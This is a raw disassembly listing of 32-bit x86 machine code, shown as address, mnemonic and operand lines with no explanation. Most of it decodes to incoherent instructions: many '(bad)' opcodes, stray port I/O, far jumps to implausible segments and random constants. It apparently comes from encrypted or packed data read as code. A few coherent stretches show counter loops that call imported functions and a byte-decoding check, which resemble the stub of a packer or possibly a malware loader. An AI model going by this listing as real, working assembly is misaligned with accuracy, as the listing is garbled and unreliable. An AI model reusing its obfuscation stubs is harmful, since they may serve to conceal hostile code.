  416edf:	or     BYTE PTR [edx+eax*2+0x1c42aaf5],0xf
  416ee7:	adc    eax,0xaf0e32de
  416eec:	or     al,0xe8
  416eee:	retf   
  416eef:	mov    ds:0xe7f53a83,eax
  416ef4:	sbb    al,0x6e
  416ef6:	(bad)  
  416ef7:	hlt    
  416ef8:	push   ebx
  416ef9:	mov    al,ds:0x1d747b73
  416efe:	adc    DWORD PTR [edi-0x1f],ecx
  416f01:	dec    edx
  416f02:	fsubrp st(5),st
  416f04:	xor    BYTE PTR cs:[eax-0x7d9adb49],dh
  416f0b:	xchg   ebp,eax
  416f0c:	xchg   esp,eax
  416f0d:	mov    ecx,0xc33d3231
  416f12:	or     esp,DWORD PTR [ebp+0x111b34b7]
  416f18:	jae    0x416ec1
  416f1a:	xchg   ecx,eax
  416f1b:	inc    edi
  416f1c:	xor    ecx,DWORD PTR [esi]
  416f1e:	mov    cl,0x5a
  416f20:	loope  0x416eb5
  416f22:	inc    edi
  416f23:	sahf   
  416f24:	pop    ds
  416f25:	daa    
  416f26:	shr    DWORD PTR [esi-0x4b5eb724],0xe8
  416f2d:	test   BYTE PTR [eax+ebp*1-0x62],ah
  416f31:	mov    al,0x4f
  416f33:	add    ah,BYTE PTR [edx-0x7]
  416f36:	(bad)  [ebp-0x5de5621c]
  416f3c:	lahf   
  416f3d:	xor    DWORD PTR [ecx],ebp
  416f3f:	(bad)  
  416f40:	sbb    al,0xdd
  416f42:	xor    BYTE PTR [ebx-0x5fd01b6c],0x59
  416f49:	ffreep st(2)
  416f4b:	sbb    dl,al
  416f4d:	js     0x416ef7
  416f4f:	daa    
  416f50:	leave  
  416f51:	sahf   
  416f52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f53:	sub    dh,BYTE PTR [ebx-0x31234b3b]
  416f59:	(bad)  
  416f5a:	jg     0x416f1c
  416f5c:	inc    eax
  416f5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f5e:	aam    0xc5
  416f60:	jne    0x416f99
  416f62:	(bad)  
  416f63:	fwait
  416f64:	jecxz  0x416ee9
  416f66:	fbstp  TBYTE PTR ds:0x5469e5c8
  416f6c:	mov    dl,0xc
  416f6e:	mov    esp,0xf117a1d
  416f73:	jno    0x416f1f
  416f75:	inc    edi
  416f76:	and    BYTE PTR [ebp-0x61ee71fc],0x4a
  416f7d:	mov    al,ds:0xa94a4185
  416f82:	vandps ymm0,ymm0,YMMWORD PTR [edx]
  416f86:	in     al,0x5c
  416f88:	sub    BYTE PTR [eax],bh
  416f8a:	xor    eax,0xbad3ba04
  416f8f:	add    eax,0x29
  416f92:	stc    
  416f93:	in     al,dx
  416f94:	mov    al,0xdb
  416f96:	mov    esp,0x2604f21e
  416f9b:	shl    edx,0x43
  416f9e:	push   ecx
  416f9f:	aas    
  416fa0:	dec    ebp
  416fa1:	in     eax,0xab
  416fa3:	stos   DWORD PTR es:[edi],eax
  416fa4:	call   0x4b58:0xfe97904e
  416fab:	mov    WORD PTR [edi+0x61b1385d],gs
  416fb1:	jmp    0x416fa2
  416fb3:	adc    edx,DWORD PTR ds:[esi-0x1]
  416fb7:	xchg   edi,eax
  416fb8:	mov    ah,0x2d
  416fba:	call   0x5480ad73
  416fbf:	dec    ebx
  416fc0:	loopne 0x416fd0
  416fc2:	add    BYTE PTR [esi-0x577d664],al
  416fc8:	mov    BYTE PTR [edi-0x58],ah
  416fcb:	jb     0x416fb4
  416fcd:	clc    
  416fce:	repnz xchg ebx,eax
  416fd0:	mov    ecx,0x50336db5
  416fd5:	jno    0x416f91
  416fd7:	lahf   
  416fd8:	adc    DWORD PTR [esi+0x57a08294],esi
  416fde:	sub    edi,DWORD PTR [ebp+ebp*2+0x2c]
  416fe2:	xchg   esp,eax
  416fe3:	jmp    0x3f174058
  416fe8:	lea    ecx,[edi-0x3e]
  416feb:	and    DWORD PTR [ecx],0xffffffea
  416fee:	lock hlt 
  416ff0:	adc    ecx,DWORD PTR [esi]
  416ff2:	les    ecx,FWORD PTR [esi+0xb]
  416ff5:	mov    dh,0xe
  416ff7:	lahf   
  416ff8:	arpl   WORD PTR [ebx+ecx*2],bx
  416ffb:	idiv   cl
  416ffd:	mov    cs,edi
  416fff:	jae    0x416fcf
  417001:	(bad)
  417005:	cmc    
  417006:	imul   ecx,DWORD PTR [ecx-0x635e84b6],0xffffffe5
  41700d:	dec    ecx
  41700e:	clc    
  41700f:	aam    0xf5
  417011:	call   0xba9b:0x38a4e925
  417018:	xchg   ebx,eax
  417019:	mov    bl,0xa1
  41701b:	shl    DWORD PTR [ecx],0xfe
  41701e:	xor    ch,BYTE PTR [esi-0x3aa22f8f]
  417024:	dec    DWORD PTR [esi+0x2ef5138f]
  41702a:	adc    ebp,DWORD PTR [eax-0x71]
  41702d:	in     al,dx
  41702e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41702f:	shl    edi,1
  417031:	into   
  417032:	cmp    esp,DWORD PTR [eax-0x20e1a1b6]
  417038:	mov    ebx,0xaa12417
  41703d:	dec    esi
  41703e:	stc    
  41703f:	popa   
  417040:	nop
  417041:	lods   eax,DWORD PTR ds:[esi]
  417042:	int3   
  417043:	in     al,0xe4
  417045:	leave  
  417046:	mov    ch,0x62
  417048:	jmp    0x7181:0xbad79995
  41704f:	int    0x30
  417051:	fld    DWORD PTR [ebx]
  417053:	(bad)  
  417054:	mov    ds:0x41eb62,eax
  417059:	jmp    0x417311
  41705e:	ret    
  41705f:	xlat   BYTE PTR ds:[ebx]
  417060:	leave  
  417061:	rcr    ecx,cl
  417063:	rcr    ecx,1
  417065:	xlat   BYTE PTR ds:[ebx]
  417066:	(bad)  
  417067:	cmp    DWORD PTR [edi-0x274f6845],edx
  41706d:	add    eax,0x787f2b45
  417072:	xchg   ebp,eax
  417073:	jle    0x4170ed
  417075:	js     0x417001
  417077:	shl    BYTE PTR [edi+0x1c8f7b67],0x82
  41707e:	js     0x417039
  417080:	adc    al,0x73
  417082:	pop    esp
  417083:	mov    ebp,0x6063588d
  417088:	popf   
  417089:	mulps  xmm0,xmm7
  41708c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41708d:	mov    eax,0xd13b8370
  417092:	es js  0x417038
  417095:	inc    ecx
  417096:	popf   
  417097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417098:	dec    edx
  417099:	loope  0x4170a8
  41709b:	aam    0x38
  41709d:	mov    edi,0xd3e86d2d
  4170a2:	aam    0xae
  4170a4:	ja     0x4170cc
  4170a6:	mov    edx,0x87cbc000
  4170ab:	pusha  
  4170ac:	shl    BYTE PTR [ebx-0x2ccb43ac],cl
  4170b2:	repz cli 
  4170b4:	sbb    DWORD PTR [esi],edi
  4170b6:	sub    DWORD PTR [ecx-0x6844f83a],edi
  4170bc:	mov    ds:0x110594bd,eax
  4170c1:	mov    ecx,0xc01fe573
  4170c6:	sub    ebp,DWORD PTR [ecx-0x1d3cc76d]
  4170cc:	test   BYTE PTR [edi-0x184346d5],dl
  4170d2:	sub    eax,0xd329940c
  4170d7:	add    DWORD PTR [esi+0x18],esp
  4170da:	cmp    ebx,edi
  4170dc:	push   0x52
  4170de:	pop    eax
  4170df:	inc    edi
  4170e0:	ficomp WORD PTR [ebx-0x1ca9f350]
  4170e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170e7:	ja     0x4170c4
  4170e9:	xchg   edx,eax
  4170ea:	lahf   
  4170eb:	pop    ecx
  4170ec:	inc    ecx
  4170ed:	mov    edi,0x907850ab
  4170f2:	jne    0x4170b1
  4170f4:	mov    ds:0xa4879940,eax
  4170f9:	ds adc al,0x8b
  4170fc:	inc    eax
  4170fd:	xor    BYTE PTR [edi+0xd359e85],dl
  417103:	outs   dx,DWORD PTR ds:[esi]
  417104:	imul   edi,DWORD PTR [ecx+0x2f25cbca],0xcec01b03
  41710e:	jmp    0x4d69:0x7aa998f
  417115:	xor    ah,dl
  417117:	dec    eax
  417118:	inc    BYTE PTR [ecx+ebp*1]
  41711b:	jle    0x417140
  41711d:	adc    al,0x8f
  41711f:	pop    edi
  417120:	clc    
  417121:	and    ch,BYTE PTR [ecx]
  417123:	int3   
  417124:	sbb    BYTE PTR [edx+0x1d43e3a8],al
  41712a:	cmp    eax,0x365edd95
  41712f:	mov    dl,0x49
  417131:	mov    ch,0x67
  417133:	aaa    
  417134:	int3   
  417135:	dec    esp
  417136:	pop    ecx
  417137:	out    dx,eax
  417138:	or     DWORD PTR [edi],0xffffffca
  41713b:	pop    esp
  41713c:	push   0xffffffe6
  41713e:	ds iret 
  417140:	pushf  
  417141:	ss dec esi
  417143:	cs inc eax
  417145:	in     eax,0x3
  417147:	push   ebx
  417148:	pop    eax
  417149:	lock inc eax
  41714b:	mov    BYTE PTR [edi],dl
  41714d:	dec    esi
  41714e:	xchg   DWORD PTR [ebx+0x5d],ebp
  417151:	inc    esi
  417152:	inc    esi
  417153:	pusha  
  417154:	es test al,cl
  417157:	inc    ebp
  417158:	or     cl,0xae
  41715b:	(bad)  
  41715c:	ror    BYTE PTR ds:0x1727c119,0x8c
  417163:	adc    BYTE PTR [edx+0x69],cl
  417166:	sub    DWORD PTR [ecx+0x2],ebp
  417169:	push   edi
  41716a:	stos   BYTE PTR es:[edi],al
  41716b:	mov    dh,0x88
  41716d:	gs out 0x7d,eax
  417170:	mov    dh,0x9f
  417172:	sti    
  417173:	jmp    0xb543b7eb
  417178:	push   edi
  417179:	mov    ?,WORD PTR [edx]
  41717b:	and    eax,0x76671bb1
  417180:	xchg   esp,eax
  417181:	leave  
  417182:	xor    eax,0x1697307d
  417187:	jecxz  0x417139
  417189:	mov    ebp,0x2b65c142
  41718e:	sub    eax,DWORD PTR [eax-0x1c0f9ffc]
  417194:	mov    dh,0xeb
  417196:	jno    0x4171a8
  417198:	jp     0x41714d
  41719a:	mov    edi,0x218c72da
  41719f:	imul   edi,DWORD PTR [esi+0x7f6c1f0c],0x397cdc3c
  4171a9:	stos   DWORD PTR es:[edi],eax
  4171aa:	cmp    eax,0xaaadb6b
  4171af:	mov    ecx,0xb08aadf9
  4171b4:	xor    al,0xd8
  4171b6:	dec    eax
  4171b7:	cld    
  4171b8:	pop    edi
  4171b9:	gs (bad) 
  4171bb:	pop    edx
  4171bc:	jle    0x417178
  4171be:	jns    0x4171c8
  4171c0:	das    
  4171c1:	inc    esp
  4171c2:	(bad)  
  4171c3:	push   eax
  4171c4:	jno    0x4171ea
  4171c6:	add    esp,ebx
  4171c8:	and    ebx,DWORD PTR [ebx+ebp*1-0x6ad5b2a6]
  4171cf:	fbstp  TBYTE PTR [edi+0x14290690]
  4171d5:	(bad)  
  4171d6:	jmp    eax
  4171d8:	imul   ebp,DWORD PTR [edx-0x487c091c],0x52
  4171df:	pusha  
  4171e0:	(bad)  
  4171e1:	mov    ebp,0x19aa336
  4171e6:	jne    0x417237
  4171e8:	ins    BYTE PTR es:[edi],dx
  4171e9:	fwait
  4171ea:	mov    ds,WORD PTR [ebx+eiz*8-0x2b92bdec]
  4171f1:	gs stos DWORD PTR es:[edi],eax
  4171f3:	xchg   DWORD PTR [bp+si],edx
  4171f6:	xor    edx,DWORD PTR [ebx]
  4171f8:	shl    BYTE PTR [esi],cl
  4171fa:	mov    bh,0x89
  4171fc:	mov    ch,0xe1
  4171fe:	and    al,0x7e
  417200:	(bad)  
  417201:	sbb    al,0x83
  417203:	jb     0x417241
  417205:	fs pop es
  417207:	arpl   WORD PTR [ebx-0x6f98314c],cx
  41720d:	ret    
  41720e:	and    eax,DWORD PTR [eax+0x58417aa3]
  417214:	adc    dh,BYTE PTR [ecx+eax*4+0x20]
  417218:	sub    al,0x4f
  41721a:	adc    BYTE PTR [eax],cl
  41721c:	ins    BYTE PTR es:[edi],dx
  41721d:	add    al,0xb2
  41721f:	jae    0x417205
  417221:	popf   
  417222:	add    BYTE PTR [edi-0x5f],0x23
  417226:	pop    esi
  417227:	outs   dx,BYTE PTR ds:[esi]
  417228:	sar    BYTE PTR [edi-0x4a547134],cl
  41722e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41722f:	outs   dx,DWORD PTR ds:[esi]
  417230:	xor    eax,0x31992e05
  417235:	cmp    DWORD PTR [edx],edx
  417237:	fist   WORD PTR [ebx]
  417239:	sbb    ah,BYTE PTR [ebx+0x47df9a40]
  41723f:	xchg   ecx,eax
  417240:	jno    0x4171cb
  417242:	xor    eax,0x87c5f86e
  417247:	ror    DWORD PTR [edx-0x311b3180],cl
  41724d:	mov    al,ds:0xcc91f0c1
  417252:	inc    ebp
  417253:	iret   
  417254:	jge    0x41720b
  417256:	pop    esi
  417257:	je     0x417205
  417259:	add    al,0xbd
  41725b:	mov    al,ds:0xaeb6a62c
  417260:	pop    ebx
  417261:	aam    0xe9
  417263:	aaa    
  417264:	jle    0x41728f
  417266:	lock paddsb mm1,QWORD PTR [edi+esi*8-0x3aecbcf1]
  41726f:	jne    0x4172ee
  417271:	repnz or eax,0x4706dcff
  417277:	imul   esi,DWORD PTR [esi],0xfffffff0
  41727a:	jg     0x4172a7
  41727c:	push   esi
  41727d:	and    edi,DWORD PTR [ecx+0x37]
  417280:	popa   
  417281:	adc    cl,BYTE PTR [ebx+esi*1+0x2b2ab853]
  417288:	mov    ch,0x29
  41728a:	sahf   
  41728b:	cmp    esi,esp
  41728d:	xor    dh,BYTE PTR [edx-0x49]
  417290:	ds push ds
  417292:	iret   
  417293:	fdiv   DWORD PTR [ebp+0x12ca038d]
  417299:	shl    BYTE PTR ds:0x10744a50,1
  41729f:	cli    
  4172a0:	inc    edx
  4172a1:	rcl    DWORD PTR [ecx+0x6c],0x88
  4172a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172a6:	ins    BYTE PTR es:[edi],dx
  4172a7:	add    al,cl
  4172a9:	test   ebx,eax
  4172ab:	dec    edi
  4172ac:	push   cs
  4172ad:	ins    BYTE PTR es:[edi],dx
  4172ae:	les    ecx,FWORD PTR [edx+0x79]
  4172b1:	and    al,0xe7
  4172b3:	and    ah,BYTE PTR ds:0x106130a4
  4172b9:	mov    edx,0xa69f5908
  4172be:	xor    bh,BYTE PTR [eax+eax*4+0x3f]
  4172c2:	fadd   QWORD PTR [ebp+0x2]
  4172c5:	xchg   ebx,eax
  4172c6:	out    dx,al
  4172c7:	mov    ebx,ds
  4172c9:	clc    
  4172ca:	test   edx,0xd099567b
  4172d0:	pop    ebp
  4172d1:	jbe    0x4172e7
  4172d3:	(bad)
  4172d6:	inc    edx
  4172d7:	daa    
  4172d8:	call   0x677a:0x99596e1
  4172df:	or     cl,BYTE PTR [ecx-0x3ea7f789]
  4172e5:	or     BYTE PTR [eax-0x7e75f327],dh
  4172eb:	mov    ebx,ss
  4172ed:	sbb    bh,BYTE PTR [esi]
  4172ef:	mov    ds:0x32df9b80,eax
  4172f4:	test   BYTE PTR [ebx+esi*4],0x2f
  4172f8:	and    ecx,DWORD PTR [eax+eiz*4+0x4827d3f0]
  4172ff:	mov    ebp,0xe1a76565
  417304:	int3   
  417305:	or     BYTE PTR [edx+0x5d31a1e5],bh
  41730b:	int    0xa1
  41730d:	je     0x41731f
  41730f:	jns    0x41737b
  417311:	push   DWORD PTR [ebp-0x8]
  417314:	push   DWORD PTR [ebp-0x4]
  417317:	call   0x40cf9c
  41731c:	mov    eax,DWORD PTR [ebp-0x4]
  41731f:	xor    eax,edi
  417321:	pop    edi
  417322:	jmp    0x4175da
  417327:	rcl    bl,cl
  417329:	rcl    esi,cl
  41732b:	rcl    esi,1
  41732d:	(bad)  
  41732f:	and    esi,DWORD PTR [ebp+0x49]
  417332:	rol    bh,1
  417334:	push   ebx
  417335:	xor    cl,bh
  417337:	loop   0x417361
  417339:	jg     0x4173b3
  41733b:	xchg   ebp,eax
  41733c:	jle    0x4173b6
  41733e:	js     0x4172c1
  417340:	mov    al,bh
  417342:	pop    ecx
  417343:	push   esp
  417344:	or     al,0x7f
  417346:	add    edi,DWORD PTR [esi-0x3]
  417349:	jmp    0xc589adcb
  41734e:	inc    edi
  41734f:	hlt    
  417350:	mov    ds:0x97ef2ace,al
  417355:	scas   eax,DWORD PTR es:[edi]
  417356:	dec    edx
  417357:	(bad)  
  417358:	mov    edi,0x82cf3460
  41735d:	arpl   WORD PTR [ebp-0x3ff4f9ba],sp
  417363:	cmp    eax,0xa5845011
  417368:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417369:	jge    0x417390
  41736b:	adc    dh,BYTE PTR [esi+ecx*2+0x4a]
  41736f:	out    0x9,eax
  417371:	(bad)  
  417372:	xor    eax,0x45c8ccd1
  417377:	test   eax,0x9e631260
  41737c:	mov    edx,0x4698165d
  417381:	mov    dl,0x73
  417383:	xchg   esp,edi
  417385:	adc    BYTE PTR [ecx],al
  417387:	fs push cs
  417389:	adc    esp,DWORD PTR [edx+0x16]
  41738c:	test   al,0x6
  41738e:	int3   
  41738f:	retf   0x4d5e
  417392:	add    DWORD PTR ds:0x60071c74,edi
  417398:	das    
  417399:	add    cl,BYTE PTR [ecx+eiz*2+0x5c3ad954]
  4173a0:	jns    0x417338
  4173a2:	xor    ah,BYTE PTR [esp+edi*4+0x17314aae]
  4173a9:	std    
  4173aa:	sub    BYTE PTR [ecx-0x7e],0x9f
  4173ae:	mov    ch,BYTE PTR [ecx]
  4173b0:	out    dx,eax
  4173b1:	lock fdiv st(4),st
  4173b4:	xor    BYTE PTR [esi+0x625c0cac],0x2c
  4173bb:	add    edx,DWORD PTR [esi]
  4173bd:	or     DWORD PTR [ecx+0x10],0x395bc52c
  4173c4:	adc    al,0x83
  4173c6:	and    DWORD PTR [esi],0xc1a75d80
  4173cc:	mov    ?,WORD PTR ds:0xc9316b62
  4173d2:	xor    DWORD PTR [edx-0x1b98486d],0xffffffe0
  4173d9:	fistp  WORD PTR [edi+0x317f2a28]
  4173df:	cmp    esp,DWORD PTR [eax-0x7f]
  4173e2:	fisubr DWORD PTR [esi+0x569ecb22]
  4173e8:	mov    dh,0xa2
  4173ea:	jbe    0x4173c4
  4173ec:	in     eax,dx
  4173ed:	jmp    0x6974:0xb6104fa3
  4173f4:	pop    ebx
  4173f5:	jo     0x41737b
  4173f7:	mov    ecx,0x8e7d296c
  4173fc:	push   0x3f
  4173fe:	shl    BYTE PTR [edx],cl
  417400:	xor    BYTE PTR ds:0x3712,bl
  417405:	not    dh
  417407:	fcomp  DWORD PTR [eax]
  417409:	jmp    0x5231:0xdd412bbf
  417410:	cli    
  417411:	call   0x1cc1fa0
  417416:	mov    edi,DWORD PTR [edi+edi*8+0x457508c7]
  41741d:	ret    
  41741e:	(bad)  
  41741f:	cli    
  417420:	test   BYTE PTR [ecx],cl
  417422:	jne    0x4173a4
  417424:	pop    ds
  417425:	div    DWORD PTR [edx+0x2c]
  417428:	xor    BYTE PTR [esi-0x24],ch
  41742b:	dec    esi
  41742c:	jb     0x417410
  41742e:	daa    
  41742f:	cmp    cl,al
  417431:	and    BYTE PTR es:[edi-0x4c],0xd7
  417436:	ret    
  417437:	cmc    
  417438:	out    dx,eax
  417439:	fdiv   QWORD PTR [eax-0x33]
  41743c:	push   ebp
  41743d:	jne    0x4173e7
  41743f:	inc    edi
  417440:	lock xor eax,0xe0ca3f38
  417446:	and    BYTE PTR [esi],bh
  417448:	fimul  DWORD PTR [ecx-0x54]
  41744b:	(bad)  
  41744d:	lds    ecx,FWORD PTR [edx+0x4c]
  417450:	test   BYTE PTR [esi],0xe4
  417453:	lods   eax,DWORD PTR ds:[esi]
  417454:	out    0xe1,eax
  417456:	outs   dx,BYTE PTR ds:[esi]
  417457:	jecxz  0x41742e
  417459:	in     eax,dx
  41745a:	lahf   
  41745b:	out    dx,al
  41745c:	and    BYTE PTR [ebx-0x55301689],cl
  417462:	inc    edi
  417463:	jmp    0x4174cf
  417465:	mov    WORD PTR [edi+ebp*4],ss
  417468:	add    edx,DWORD PTR [eax+eax*8-0x10]
  41746c:	mov    eax,gs:0x16512db9
  417472:	lahf   
  417473:	lahf   
  417474:	ins    DWORD PTR es:[edi],dx
  417475:	retf   0x2ee6
  417478:	(bad)  
  417479:	and    al,0x63
  41747b:	retf   0xc43c
  41747e:	sbb    al,0x80
  417480:	pop    ebx
  417481:	les    ebx,FWORD PTR [ebp-0x6a972f30]
  417487:	pop    ebx
  417488:	(bad)  
  417489:	shr    al,cl
  41748b:	sub    cl,ch
  41748d:	xor    eax,0x2e5a77a2
  417492:	stos   DWORD PTR es:[edi],eax
  417493:	pushf  
  417494:	loop   0x417442
  417496:	cs cld 
  417498:	adc    ecx,DWORD PTR [ebp+0x2d]
  41749b:	cmc    
  41749c:	pop    ss
  41749d:	loope  0x417452
  41749f:	jne    0x4174cd
  4174a1:	aaa    
  4174a2:	sub    edx,DWORD PTR [ecx-0x2ae7471]
  4174a8:	cmp    edx,ebx
  4174aa:	daa    
  4174ab:	cmp    DWORD PTR [ecx-0x3f],0xffffffb2
  4174af:	sbb    dh,BYTE PTR ds:0x4a6274c1
  4174b5:	push   0x7e
  4174b7:	mov    ah,0x6a
  4174b9:	jp     0x41745e
  4174bb:	mov    ebp,es
  4174bd:	popa   
  4174be:	xchg   ebx,esi
  4174c0:	jns    0x417443
  4174c2:	sub    dh,BYTE PTR [ecx]
  4174c4:	mov    ch,0x39
  4174c6:	imul   eax,DWORD PTR [eax-0x44],0xcb8631c
  4174cd:	push   0xe704ceba
  4174d2:	push   0xffffffde
  4174d4:	cmp    al,0x76
  4174d6:	(bad)  
  4174d7:	and    DWORD PTR [ebx],edi
  4174d9:	mov    ah,BYTE PTR [ebx+0x47]
  4174dc:	jp     0x417504
  4174de:	test   BYTE PTR [edi],ch
  4174e0:	cld    
  4174e1:	jge    0x4174b2
  4174e3:	mov    dh,0x38
  4174e5:	mov    BYTE PTR [ebp-0x87ff8a0],ah
  4174eb:	mov    ds:0xf85180a9,eax
  4174f0:	ss ins DWORD PTR es:[edi],dx
  4174f2:	in     al,0xb1
  4174f4:	jle    0x417562
  4174f6:	push   ss
  4174f7:	push   eax
  4174f8:	cmp    DWORD PTR [ebx+0x5943bb56],esp
  4174fe:	sub    DWORD PTR [ebp+0x1b],0xffffffef
  417502:	(bad)  ds:0xfa188a07
  417508:	retf   
  417509:	aaa    
  41750a:	mov    bh,0x98
  41750c:	mov    ds:0xca8b1d98,al
  417511:	fdivr  DWORD PTR [edx-0x54d63728]
  417517:	dec    ebp
  417518:	push   ebx
  417519:	adc    eax,0xda0cd06
  41751e:	mov    al,ds:0x5d5982de
  417523:	sub    eax,esp
  417525:	(bad)  
  417527:	inc    edx
  417528:	sub    eax,0xb0ec1cea
  41752d:	mov    ds:0xd0c9a5,eax
  417532:	call   0xabba2384
  417537:	pusha  
  417538:	mov    bl,0x56
  41753a:	arpl   WORD PTR [eax],si
  41753c:	xchg   BYTE PTR [edi+esi*2+0x43],al
  417540:	mov    ah,0x56
  417542:	mov    esi,0xdd1b1fbe
  417547:	aaa    
  417548:	gs mov cs,eax
  41754b:	push   ss
  41754c:	push   eax
  41754d:	ret    
  41754e:	fs pop es
  417550:	fld    DWORD PTR [esi]
  417552:	mov    bh,0xf0
  417554:	stos   DWORD PTR es:[edi],eax
  417555:	and    ebx,DWORD PTR [edi-0x1a28e635]
  41755b:	xor    al,BYTE PTR [esi+0x739257b3]
  417561:	jo     0x4175d3
  417563:	xchg   ebx,eax
  417564:	popa   
  417565:	jmp    0xfa2a:0x7c9d82c8
  41756c:	jne    0x417566
  41756e:	adc    al,0x26
  417570:	out    0x36,eax
  417572:	in     al,0x69
  417574:	mov    ebx,0x4615fa3c
  417579:	push   esp
  41757a:	xor    edx,DWORD PTR [ebx-0x77]
  41757d:	inc    eax
  41757e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41757f:	add    esi,DWORD PTR [ebx]
  417581:	cmp    ah,BYTE PTR [esi*2-0x13bd97ce]
  417588:	fisub  WORD PTR [eax]
  41758a:	dec    edi
  41758b:	sbb    DWORD PTR [esi+ebx*2+0x1d],ebp
  41758f:	test   BYTE PTR [ebx-0x1a30c37c],cl
  417595:	push   ss
  417596:	xchg   ecx,eax
  417597:	push   esp
  417598:	shr    DWORD PTR [ecx+0x5c3a51a3],0x97
  41759f:	push   ss
  4175a0:	mov    ebp,0x15eeedbb
  4175a5:	xor    DWORD PTR [eax],ecx
  4175a7:	push   es
  4175a8:	enter  0xbc78,0x7d
  4175ac:	iret   
  4175ad:	cmp    al,0x8f
  4175af:	jnp    0x4175d4
  4175b1:	pusha  
  4175b2:	jns    0x4175c1
  4175b4:	sub    al,0xee
  4175b6:	addr16 fs (bad) 
  4175b9:	sub    eax,0xf0d61603
  4175be:	das    
  4175bf:	aas    
  4175c0:	mov    edx,0xc3beb11f
  4175c5:	enter  0xcedd,0xb7
  4175c9:	fisttp WORD PTR [bx+si+0x4867]
  4175ce:	sbb    ah,BYTE PTR [esi+edi*4]
  4175d1:	mov    esi,0xc580d7d
  4175d6:	arpl   WORD PTR [ebx+eiz*2],si
  4175d9:	cmp    al,BYTE PTR [ebx]
  4175db:	(bad)  
  4175dc:	pop    esi
  4175dd:	leave  
  4175de:	ret    0xc
  4175e1:	push   ebp
  4175e2:	mov    ebp,esp
  4175e4:	push   ecx
  4175e5:	mov    DWORD PTR ds:0x42aad9,0x1f
  4175ef:	cmp    DWORD PTR ds:0x42aad9,0x0
  4175f6:	je     0x41764a
  4175fc:	cmp    DWORD PTR ds:0x42aad9,0x5
  417603:	jne    0x417621
  417609:	push   0x42aa19
  41760e:	push   0x42aa65
  417613:	push   DWORD PTR [ebp-0x14]
  417616:	push   0x42abb2
  41761b:	call   DWORD PTR ds:0x41d10c
  417621:	cmp    DWORD PTR ds:0x42aad9,0x6
  417628:	jne    0x417639
  41762e:	mov    eax,ds:0x42aad9
  417633:	dec    eax
  417634:	mov    ds:0x42aad9,eax
  417639:	mov    eax,ds:0x42aad9
  41763e:	dec    eax
  41763f:	mov    ds:0x42aad9,eax
  417644:	jmp    0x4175ef
  417649:	dec    eax
  41764a:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  417651:	and    DWORD PTR ds:0x42aa6d,0x0
  41765b:	mov    eax,ds:0x42aa6d
  417660:	inc    eax
  417661:	mov    ds:0x42aa6d,eax
  417666:	cmp    DWORD PTR ds:0x42aa6d,0x23
  41766d:	jne    0x417685
  417673:	push   0x42ad52
  417678:	push   0x0
  41767a:	push   0x2c74
  41767f:	call   DWORD PTR ds:0x41d110
  417685:	cmp    DWORD PTR ds:0x42aa6d,0x19
  41768c:	jb     0x41765b
  417692:	mov    eax,DWORD PTR [ebp+0x8]
  417695:	mov    al,BYTE PTR [eax]
  417697:	add    al,0x3b
  417699:	xor    al,0x43
  41769b:	cmp    al,0xcb
  41769d:	jne    0x417b32
  4176a3:	mov    eax,DWORD PTR [ebp+0x8]
  4176a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4176a9:	jmp    0x4178d1
  4176ae:	ror    esp,cl
  4176b0:	xlat   BYTE PTR ds:[ebx]
  4176b1:	cmp    eax,0xd2d9c9d7
  4176b6:	jns    0x41767b
  4176b8:	sub    al,0x9b
  4176ba:	dec    ecx
  4176bb:	nop
  4176bc:	popf   
  4176bd:	mov    bl,0x7f
  4176bf:	sub    eax,0x7e05787f
  4176c4:	js     0x41773e
  4176c6:	dec    edx
  4176c7:	je     0x41769b
  4176c9:	sti    
  4176ca:	into   
  4176cb:	push   0x4d
  4176cd:	ja     0x417678
  4176cf:	lea    ebp,[edx+0x58]
  4176d2:	xor    al,0xcd
  4176d4:	repnz aaa 
  4176d6:	int3   
  4176d7:	or     eax,0x8ea7bf14
  4176dc:	xchg   ecx,eax
  4176dd:	cmp    bl,bl
  4176df:	jns    0x417737
  4176e1:	aas    
  4176e2:	pop    eax
  4176e3:	cmp    DWORD PTR [ebx],0x3e
  4176e6:	aaa    
  4176e7:	or     eax,0x92760db8
  4176ec:	pop    eax
  4176ed:	not    DWORD PTR [ebx]
  4176ef:	mov    ah,0x21
  4176f1:	(bad)  
  4176f2:	jecxz  0x417763
  4176f4:	add    eax,0x12383381
  4176fa:	or     BYTE PTR [edx],al
  4176fc:	inc    DWORD PTR [eax-0x7b]
  4176ff:	lods   al,BYTE PTR ds:[esi]
  417700:	je     0x4176c2
  417702:	inc    ebp
  417703:	loop   0x4176e7
  417705:	sub    al,0x8f
  417707:	cmp    eax,0x8900edc6
  41770c:	or     al,BYTE PTR [edx+esi*1+0x2b]
  417710:	sbb    al,0xc0
  417712:	ror    DWORD PTR [ecx],1
  417714:	mov    edi,0xe2cbbb38
  417719:	(bad)  
  41771a:	mov    ebp,0x813fcfbb
  41771f:	push   edi
  417720:	dec    esi
  417721:	push   ecx
  417722:	mov    eax,?
  417724:	mov    eax,ds:0x98c061a6
  417729:	jns    0x417745
  41772b:	rcr    BYTE PTR [ebp+0x332db8c],0x43
  417732:	dec    esp
  417733:	rcr    BYTE PTR [eax+0x6cde8b21],cl
  417739:	xchg   edx,eax
  41773a:	pop    ebx
  41773b:	mov    ch,0xa3
  41773d:	int    0xb4
  41773f:	data16 xor al,BYTE PTR [edx+0x2e]
  417743:	xlat   BYTE PTR ds:[ebx]
  417744:	neg    BYTE PTR [eax+0x4b1d7519]
  41774a:	in     al,dx
  41774b:	arpl   dx,si
  41774d:	push   ds
  41774e:	push   es
  41774f:	mov    dh,0x3e
  417751:	cwde   
  417752:	xor    eax,0x1ccc46b5
  417757:	je     0x417725
  417759:	cwde   
  41775a:	xchg   esp,eax
  41775b:	imul   esi,DWORD PTR [edx-0x60281fa1],0xb11b43
  417765:	int    0xb6
  417767:	pop    edi
  417768:	sbb    al,0x47
  41776a:	pop    ss
